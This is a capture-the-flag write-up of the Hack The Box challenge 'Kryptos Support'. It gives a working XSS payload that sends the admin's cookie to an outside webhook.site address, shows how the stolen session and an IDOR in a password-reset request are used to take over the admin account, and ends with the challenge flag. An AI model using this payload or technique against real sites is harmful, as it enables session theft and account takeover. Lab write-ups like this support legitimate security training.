# Kryptos Support

```
The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?
```

Loading the challenge we see we can send a ticket. Using some test value it says an admin will review it shortly...

This is a good sign we can perform XSS

Try the payload:

```
<svg onload=document['location']="https://webhook.site/32847513-047e-4a58-b5a8-5b8c4abb0401/?c="+document['cookie']//
```

we see a request come through to our webhook with the admin cookie!

set cookie in devtools

this confused me for a while until I found /settings. Here is a password reset functionality. Looking at the POST request body:
```json
{"password":"abc","uid":"100"}
``` 

This looks like an IDOR, let's intercept the request in burpsuite and change uid to 1

```json
{"password":"abc","uid":"1"}
```

in the response:

```json
{"message":"Password for admin changed successfully!"}
```

great, now just log in as admin and get the flag

HTB{x55_4nd_id0rs_ar3_fun!!}